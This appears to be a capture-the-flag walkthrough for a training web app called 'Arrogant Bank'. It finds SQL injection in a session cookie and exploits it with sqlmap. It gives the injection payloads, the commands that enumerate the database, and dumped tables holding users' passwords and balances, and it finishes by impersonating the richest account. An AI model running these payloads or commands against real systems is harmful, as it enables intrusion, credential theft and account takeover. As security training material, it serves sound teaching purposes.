# Challenge #3 - Arrogant Bank

## Credentials
Username: giovanni
Password: mycoolpass

## Objectives

- You want to find SQL injection vulnerabilities in the website, determining the type of SQL injection and its exploitability.
- You will also have to extract information from the database exploiting the vulnerability
- Find out the password of the richest in bank
- Become the richest in the bank, to gain respect

## LicenseWhat you will learn

- Inspection of the application logic with burp proxy
- Discovery of a SQL injection
- Exploitation of a SQL injection with SQLMap

## Hints

- MySQL
- Cookie Manipulation

## Steps

Log into the application using the giovanni credentials.

Send the page myaccount.php to burp and change the cookie user to "'" and sed the request.

```
user='
```

In the response the code has one MySql error message.

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
```

Now let's send the endoint to SQLMap.

```
sqlmap -u http://3.challenge.sqli.site/myaccount.php --cookie="user=a*" --batch --dbms=mysql
```

After a few moments SQLMap will return the vulnerable parameter.

```
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: user=' OR NOT 7467=7467-- EMVm

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: user=' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7162716a71,(SELECT (ELT(8922=8922,1))),0x717a6a7671,0x78))s), 8446744073709551610, 8446744073709551610)))-- pozw

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: user=' AND (SELECT 8064 FROM (SELECT(SLEEP(5)))dhkQ)-- FIpi

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: user=' UNION ALL SELECT NULL,CONCAT(0x7162716a71,0x6b6c754a5168626679575968584653744c43494353586570527342594964784b5256436e4f6d7245,0x717a6a7671)-- -
```

List all databases.

```
sqlmap -u http://3.challenge.sqli.site/myaccount.php --cookie="user=a*" --batch --dbms=mysql --dbs

available databases [2]:                                 [*] arrogant_bank
[*] information_schema
```

List all tables.

```
sqlmap -u http://3.challenge.sqli.site/myaccount.php --cookie="user=a*" --batch --dbms=mysql -D arrogant_bank --tables

Database: arrogant_bank                     [3 tables]
+----------+
| accounts |
| customer |
| users    |
+----------+
```

Dump the users table.

```
sqlmap -u http://3.challenge.sqli.site/myaccount.php --cookie="user=a*" --batch --dbms=mysql -D arrogant_bank -T users --dump

Database: arrogant_bank                     Table: users
[4 entries]
+----+----------+-------------------------+----------+
| id | name     | password                | username |
+----+----------+-------------------------+----------+
| 1  | Armando  | The<<$ArmandoPassword>> | armando  |
| 2  | Barak    | 3809090909              | barak    |
| 3  | Clint    | thegood                 | clint    |
| 4  | Giovanni | mycoolpass              | giovanni |
+----+----------+-------------------------+----------+
```

Dump the accounts table.

```
sqlmap -u http://3.challenge.sqli.site/myaccount.php --cookie="user=a*" --batch --dbms=mysql -D arrogant_bank -T accounts --dump

Database: arrogant_bank                     Table: accounts
[4 entries]
+----+---------+-------+-------+---------------------+
| id | user_id | money | views | last_access         |
+----+---------+-------+-------+---------------------+
| 1  | 4       | 10    | 0     | 2021-10-03 11:46:05 |
| 2  | 2       | 50    | 0     | 0000-00-00 00:00:00 |
| 3  | 3       | 100   | 0     | 0000-00-00 00:00:00 |
| 4  | 1       | 1000  | 0     | 0000-00-00 00:00:00 |
+----+---------+-------+-------+---------------------+
```

The richest bank client is the user id 1. Log using this user to inpersonate the richiest client.